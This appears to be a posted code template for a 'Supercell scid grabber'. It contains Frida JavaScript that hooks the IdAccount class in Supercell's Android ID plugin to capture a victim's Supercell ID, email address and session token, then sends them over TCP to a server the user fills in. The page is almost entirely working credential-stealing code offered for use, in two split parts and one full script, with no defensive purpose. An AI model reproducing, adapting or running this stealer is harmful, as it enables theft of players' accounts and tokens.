# Supercell scid grabber code



# This part of the code retrieves victim account data:

```javascript
Java.perform(function () {
    var IdAccount = Java.use("com.supercell.id.scid_plugin.IdAccount");

    IdAccount.toString.overload().implementation = function () {
        var result = this.toString();
        var supercellId = this.supercellId.value;
        var email = this.email.value;
        var scidToken = this.scidToken.value;

        console.log(supercellId);
        console.log(email);
        console.log(scidToken);

        var message = "Supercell ID: " + supercellId + "\nEmail: " + email + "\nToken: " + scidToken;
        
        sendDataToServer(message);

        return result;
    };
});
```

# This part manages the connection to the remote server:

```javascript
Java.perform(function () {
    var Socket = Java.use("java.net.Socket");
    var OutputStream = Java.use("java.io.OutputStream");
    var BufferedWriter = Java.use("java.io.BufferedWriter");
    var OutputStreamWriter = Java.use("java.io.OutputStreamWriter");

    var serverAddress = "YOUR ADDRESS";
    var serverPort = YOUR PORT;

    function createTcpConnection() {
        var socket = new Socket(serverAddress, serverPort);
        var outputStream = socket.getOutputStream();
        var writer = BufferedWriter.$new(OutputStreamWriter.$new(outputStream, "UTF-8"));
        return { writer: writer, socket: socket, outputStream: outputStream };
    }

    function sendDataToServer(message) {
        var { writer, socket, outputStream } = createTcpConnection();
        writer.write(message);
        writer.flush();
        writer.close();
        outputStream.close();
        socket.close();
        console.log("Data sent to TCP server");
    }
});
```
Full Script
```javascript
// template by Kxrimmmm
Java.perform(function () {
    var IdAccount = Java.use("com.supercell.id.scid_plugin.IdAccount");

    IdAccount.toString.overload().implementation = function () {
        var result = this.toString();
        var supercellId = this.supercellId.value;
        var email = this.email.value;
        var scidToken = this.scidToken.value;

        console.log(supercellId);
        console.log(email);
        console.log(scidToken);

        sendToTcpServer(supercellId, email, scidToken);

        return result;
    };

    // Function to send data over TCP
    function sendToTcpServer(supercellId, email, scidToken) {
        var InetAddress = Java.use("java.net.InetAddress");
        var OutputStream = Java.use("java.io.OutputStream");
        var BufferedWriter = Java.use("java.io.BufferedWriter");
        var OutputStreamWriter = Java.use("java.io.OutputStreamWriter");

        var serverAddress = "YOUR ADDRESS"; // Change this to your TCP server's address
        var serverPort = YOUR PORT; // Change this to your TCP server's port

        // Create socket connection to the server
        var socket = new java.net.Socket(serverAddress, serverPort); // Socket creation removed from here
        var outputStream = socket.getOutputStream();
        var writer = BufferedWriter.$new(OutputStreamWriter.$new(outputStream, "UTF-8"));

        // Create the message to be sent
        var message = "Supercell ID: " + supercellId + "\nEmail: " + email + "\nToken: " + scidToken;

        // Send the message to the server
        writer.write(message);
        writer.flush();
        writer.close();
        outputStream.close();
        socket.close();

        console.log("Data sent to TCP server");
    }
});
```
